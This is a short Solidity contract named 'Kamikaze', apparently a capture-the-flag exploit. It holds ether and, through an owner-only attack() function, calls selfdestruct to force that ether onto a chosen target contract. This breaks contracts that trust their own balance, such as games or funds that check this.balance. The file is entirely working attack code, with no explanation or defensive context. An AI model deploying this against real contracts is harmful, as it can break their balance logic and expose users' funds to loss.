pragma solidity ^0.4.21;

contract Kamikaze {
    address public owner;
    address public target;
    
    function Kamikaze(address _target) public payable {
        require(msg.value > 0);
        
        target = _target;
        owner = msg.sender;
    }
    
    function attack() public {
        require(msg.sender == owner);
        
        selfdestruct(target);
    }
}
